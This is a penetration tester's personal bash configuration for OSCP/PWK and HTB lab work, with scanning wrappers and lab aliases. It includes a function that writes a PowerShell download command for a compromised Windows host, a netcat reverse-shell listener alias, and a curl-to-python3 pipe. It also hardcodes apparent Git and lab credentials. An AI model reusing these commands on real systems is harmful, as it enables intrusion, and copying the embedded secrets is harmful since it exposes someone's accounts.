#Make sure you are on bash profile
if [ -e $HOME/.bash_aliases ]; then
    source $HOME/.bash_aliases
fi


#Bash aliases
#---------------------------------------------------

#Testing Functions to use for enumeration

function pxinstall() {
    python3 -m pipx install git+$1
}

function dirsearch() {
    echo "Usage: dirsearch.py <url> <extension(s)>"
    python3 ~/Tools/dirsearch/dirsearch.py -u $1 -e $2 -t 50 b
}
function dirsearch_r() {
    echo "Usage: dirsearch.py <url> <extension(s)>"
    python3 ~/Tools/dirsearch/dirsearch.py -u $1 -e $2 -t 50 b -r -R 4
}
function nmap_fast() {
    echo "Usage: nmap_fast <output.txt> <ip/24>"
    nmap -sV -O --top-ports 200 --open -oA $1 $2
}
function nmap_full() {
    echo "Usage: nmap_full <output.txt> <ip/24>"
    nmap -sC -sV -O --open -p- -oA $1 $2
}
function nmap_udp() {
    echo "Usage: nmap_udp <output.txt> <ip/24>"
    nmap -sU -p- -oA $1 $2
}
function nmap_recon() {
    echo "Usage: nmap_recon <output.txt> <ip/24>"
    nmap -sC -sV -oA $1 $2
}
function dirb_without_auth() {
    echo "Usage: dirb <url> <wordlist> <output.txt>"
    dirb $1 $2 -o $3 -N 302,404 -R -w
}
function dirb_with_auth() {
    echo "Usage: drib <url> <wordlist> <output.txt> <user> <password>"
    dirb $1 $2 -o $3 -N 302,404 -R -w -u $4:$5
}
function nikto_without_auth() {
    echo "Usage: nikto <output.txt> <url>"
    nikto -Display 1234EPV -o $1 -Format htm -Tuning 1234567890abcdex -host $2 -404code -404string
}
function nikto_with_auth() {
    echo "Usage: nikto <output.txt> <url> <user> <password>"
    nikto -Display 1234EPV -o $1 -Format htm -Tuning 1234567890abcdex -host $2 -404code -404string -id $3:$4
}
function killproc() {
    echo "Usage: killproc <pid>"
    kill -9 $($1)
}
function httpsrv() {
    echo "Usage: httpsrv <port>"
    python -m SimpleHTTPServer $1
}
# cheat sheets (github.com/chubin/cheat.sh), find out how to use commands
# example 'cheat tar'
# for language specific question supply 2 args first for language, second as the question
# eample: cheat python3 execute external program
function cheat() {
    if [ "$2" ]; then
        curl "https://cheat.sh/$1/$2+$3+$4+$5+$6+$7+$8+$9+$10"
    else
        curl "https://cheat.sh/$1"
    fi
}
function speedtest() {
    curl -s https://raw.githubusercontent.com/sivel/speedtest-cli/master/speedtest.py | python3 -
}
function dadjoke() {
    curl https://icanhazdadjoke.com
}
function dict() {
    if [ "$3" ]; then
        curl "dict://dict.org/d:$1 $2 $3"
    elif [ "$2" ]; then
        curl "dict://dict.org/d:$1 $2"
    else
        curl "dict://dict.org/d:$1"
    fi
}
function ipgeo() {
    # Specify ip or your ip will be used
    if [ "$1" ]; then
        curl "http://api.db-ip.com/v2/free/$1"
    else
        curl "http://api.db-ip.com/v2/free/$(myip)"
    fi
}

#Alias to install package with pipx
alias pinstall="python3 -m pipx install"

#Alias to run package with pipx
alias prun="python3 -m pipx run"

#Alias to list pipx packages
alias plist="python3 -m pipx list"

#alias to search windows scheduled tasks for privilege escalation
alias winsch='cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM'

#Kill any lingering openvpn sessions
alias killvpn='killall -w openvpn'

#Kill any lingering ssh sessions
alias killssh="killall ssh"

#Bash alias to use exa to list directories and files
alias l="exa -la"

#Bash alias to scripts directory
alias scriptdir="cd ~/Scripts/"

#Bash alias to tools directory
alias tooldir="cd ~/Tools/"

#Bash alias to echo and remind to tmux start log
alias tmuxlogging="echo 'prefix + shift +  p to start logging'"

#Bash alias to echo and remind to tmux save log
alias tmuxsave="echo 'prefix + alt + shift + p to save complete pane history'"

#Bash alias to echo and remind to install Tmux plugin
alias tmuxplugin="echo 'prefix + I in tmux session to install tmux plugins'"

#Bash alias to reload TMUX in session
alias tmuxreload="tmux source ~/.tmux.conf"

#Bash alias to go back to home directory
alias home="cd /home/kali/Desktop"

#Bash alias for gnome screenshot
alias gpic="gnome-screenshot -w"

#Bash aliases to connect to lab machines
alias rd2016='rdesktop -g 95% -u administrator 172.16.198.5'
alias rd2010='rdesktop -g 95% -u administrator 192.168.198.10'
alias studebian='ssh student@192.168.198.44'
alias rootdebian='ssh root@192.168.198.44'

#alias for searchsploit
alias ss='searchsploit'

#Sudo alias for other alias to run with root priv
alias sudo='sudo '

#Make diff look pretty
alias diff='diff --color=auto'

#MSF Pattern Create
alias msfpattern='/usr/share/metasploit-framework/tools/exploit/pattern_create.rb'

#MSF Pattern Offset
alias msfoffset='/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb'

#URL Encode alias
alias urlencode='python -c "import sys, urllib as ul; print ul.quote_plus(sys.argv[1])"'

#URL Decode alias
alias urldecode='python -c "import sys, urllib as ul; print ul.unquote_plus(sys.argv[1])"'

#Update using Linux date command
alias timeupdate='sudo date -s "$(wget -qSO- --max-redirect=0 google.com 2>&1 | grep Date: | cut -d -f5-8)Z"'

#View mounted drives
alias mnt="mount | awk -F' ' '{ printf \"%s\t%s\n\",\$1,\$3; }' | column -t | egrep ^/dev/ | sort"

#Count files in directory
alias count='find . -type f | wc -l'

#Alias for show environment variables sorted
alias showenv='env | sort'

#Alias for git clone
alias gc='git clone'

#Alias for change and list directory
alias cdls='cd "$@" && ls'

#Alias for source command
alias s='source'

#Alias for source bash profile
alias sb='source ~/.bashrc'

#Copy progress bar
alias cpv='rsync -ah --info=progress2'

#Wget
alias wget='wget -c '

#Impacket Smb Server
alias smbsrv='smbserver.py share .'

#Clear screen
alias c='clear'

#List contents
alias ls='ls -al --color=auto'

#List hidden contents
alias l.='ls -d .* --color=auto'

#Colorize Grep
alias grep='grep --color=auto'

#History and jobs shortcuts
alias h='history'
alias j='jobs -l'

#Ports
alias ports='netstat -tulanp'

#HTB Start Openvpn
alias htblab='sudo openvpn /home/kali/Desktop/PWK/Setup/Gfuen640.ovpn'

#PWK Connect
alias pwk='sudo openvpn /home/kali/Desktop/PWK/Setup/OS-86533-PWK.ovpn'

#Change into PWK directory
alias pwkdir='cd /home/kali/Desktop/PWK/OSCP/lab/'

#Change into PUBLIC directory
alias pwkpublic='cd /home/kali/Desktop/PWK/OSCP/lab/PUBLIC/'

#Change into IT Directory
alias pwkit='cd /home/kali/Desktop/PWK/OSCP/lab/IT/'

#Change into directory
alias ..='cd ../'
alias ...='cd ../../'  
alias ....='cd ../../../'

#Get Logs
alias logs='cd /root/'

#New Tmux
alias ts='tmux new-session -s'

#Netcat reverse shell
alias lsn='sudo rlwrap -r -f . nc -lnvp'

#Copy text to clipboard
alias clip='xclip -sel clip'

#aliases for FTP Server
alias startftp="systemctl restart pure-ftpd"
alias stopftp="systemctl stop pure-ftpd"
alias statusftp="systemctl status pure-ftp"

#alias for PWK Connection
alias pwk_ping="ping 10.11.1.220"

#Nmap prettify
alias nmap="grc nmap"

#Less prettify
alias less='less -FSRXc'  

#End of aliases
#-------------------------------------------------------------------------------

#Export Env Variables
export WORD1="/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
export WORD2="/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt"
export WORD3="/usr/share/wordlists/rockyou.txt"
export WORD4="/usr/share/wordlists/dirbuster/apache-user-enum-1.0.txt"
export WORD5="/usr/share/wordlists/dirbuster/apache-user-enum-2.0.txt"
export WORD6="/usr/share/wordlists/dirb/others/best1050.txt"
export WORD7="/usr/share/wordlists/dirb/others/names.txt"
export SECLISTS="/usr/share/seclists"
export WORDDIR="/usr/share/wordlists"
export TARGET_RANGE="10.11.1.1-255"
export PWK_CONTROL="https://10.70.70.70/oscpanel/labcpanel.php?md=aa04b57c7f43f59f194decebb776223e&pid=792549&servers=0"
export GIT_PASS="09d200ef8f3d9f170655cbad5cb9cadf22bca4b5"
export TOOLS="~/Tools/"
export SCRIPT="~/Scripts/"
export USER="OS-86533"
export PASS="7vZGkrq9xL1"
export FTP_USER="offsec"
export FTP_PASS="lab"
export TERM="xterm-256color"


#Bash Profile
#-------------------------------------------------------------------------------

#Bash Prompt Color Scheme
txtblk='\[\e[0;30m\]' # Black - Regular
txtred='\[\e[0;31m\]' # Red
txtgrn='\[\e[0;32m\]' # Green
txtylw='\[\e[0;33m\]' # Yellow
txtblu='\[\e[0;34m\]' # Blue
txtpur='\[\e[0;35m\]' # Purple
txtcyn='\[\e[0;36m\]' # Cyan
txtwht='\[\e[0;37m\]' # White
bldblk='\[\e[1;30m\]' # Black - Bold
bldred='\[\e[1;31m\]' # Red
bldgrn='\[\e[1;32m\]' # Green
bldylw='\[\e[1;33m\]' # Yellow
bldblu='\[\e[1;34m\]' # Blue
bldpur='\[\e[1;35m\]' # Purple
bldcyn='\[\e[1;36m\]' # Cyan
bldwht='\[\e[1;37m\]' # White
unkblk='\[\e[4;30m\]' # Black - Underline
undred='\[\e[4;31m\]' # Red
undgrn='\[\e[4;32m\]' # Green
undylw='\[\e[4;33m\]' # Yellow
undblu='\[\e[4;34m\]' # Blue
undpur='\[\e[4;35m\]' # Purple
undcyn='\[\e[4;36m\]' # Cyan
undwht='\[\e[4;37m\]' # White
bakblk='\[\e[40m\]'   # Black - Background
bakred='\[\e[41m\]'   # Red
badgrn='\[\e[42m\]'   # Green
bakylw='\[\e[43m\]'   # Yellow
bakblu='\[\e[44m\]'   # Blue
bakpur='\[\e[45m\]'   # Purple
bakcyn='\[\e[46m\]'   # Cyan
bakwht='\[\e[47m\]'   # White

#Bash prompt variables
day="${txtpur}"
time="${txtpur}"
user="${txtblu}"
host="${txtblu}"
dir="${txtwht}"
bracket="${txtpur}"

#Configure Bash header
force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
	# We have color support; assume it's compliant with Ecma-48
	# (ISO/IEC-6429). (Lack of such support is extremely rare, and such
	# a case would tend to support setf rather than setaf.)
	color_prompt=yes
    else
	color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    prompt_color='\[\033[;32m\]'
    info_color='\[\033[1;34m\]'
    prompt_symbol=㉿
    PS1=$prompt_color'┌──${debian_chroot:+($debian_chroot)──}('$info_color'\u${prompt_symbol}\h'$prompt_color')-[\[\033[0;1m\]\w'$prompt_color']\n'$prompt_color'└─'$info_color'\$\[\033[0m\] '
    # BackTrack red prompt
    #PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt



# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=5000
HISTFILESIZE=5000

#   extract:  Extract most know archives with one command
function extract() {
    if [ -f $1 ] ; then
        case $1 in
        *.tar.bz2)   tar xjf $1     ;;
        *.tar.gz)    tar xzf $1     ;;
        *.bz2)       bunzip2 $1     ;;
        *.rar)       unrar e $1     ;;
        *.gz)        gunzip $1      ;;
        *.tar)       tar xf $1      ;;
        *.tbz2)      tar xjf $1     ;;
        *.tgz)       tar xzf $1     ;;
        *.zip)       unzip $1       ;;
        *.Z)         uncompress $1  ;;
        *.7z)        7z x $1        ;;
        *) echo "'$1' cannot be extracted via extract()" ;;
            esac
        else
            echo "'$1' is not a valid file"
        fi
}

# You need xclip in order to use this apt install xclip
#Output powershell script to download file on compromised Windows machine
function psdl(){
tunip=$(ip a s tun0 | awk -F'[/ ]+' '/inet[^6]/{print $3}');
read -p "File name to upload? " fileName
#fileName=$1 Or you can just pass the fileName into psdl without prompt
longstring="powershell.exe -nop -ep bypass -c \"IEX(New-Object Net.WebClient).DownloadFile('http://$tunip/$fileName','C:\\tmp\\$fileName')\"" # Fix C:\\ to your path
echo "$longstring" | xclip -selection clipboard
echo "Copied to clipboard"
}


# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi


#Set MYIP environment variable
if test -e "/sys/class/net/tun0" ; then
	export MYIP=$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+') 
	alias myip="export MYIP=$(ip -f inet addr show tun0 | grep -Po 'inet \K[\d.]+') ; echo $MYIP"
fi
